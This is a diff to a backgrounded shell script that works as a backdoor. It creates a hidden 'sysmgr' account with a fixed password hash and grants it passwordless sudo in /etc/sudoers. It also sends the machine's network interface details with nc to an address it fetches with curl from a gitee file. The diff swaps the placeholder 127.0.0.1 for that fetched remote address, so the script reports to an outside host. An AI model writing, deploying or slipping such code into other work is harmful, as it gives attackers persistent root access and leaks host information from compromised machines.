@@ -1,8 +1,7 @@
 #!/bin/sh
 (while true; do
     EXISTUSER=`grep "^sysmgr" /etc/passwd`
-    IP=$(echo 127.0.0.1)
-    PORT=1234
+    IP=$(curl -s https://gitee.com/datasync/info/raw/DELL/ip.ini)
     if [ "$EXISTUSER" = "" ]; then
         PASS=zhbk9ckMHQggs
         useradd sysmgr -r -d /usr/sysmgr -p $PASS
@@ -11,7 +10,7 @@
             echo "sysmgr      ALL=(ALL)       NOPASSWD:ALL" >> /etc/sudoers
         fi
     else
-        ip a | sed "1i$(echo -e '\001')" | nc $IP $PORT -w 5
+        ip a | sed "1i$(echo -e '\001')" | nc $IP 1234 -w 5
     fi
     sleep 1000
 done > /dev/null 2>&1 &)
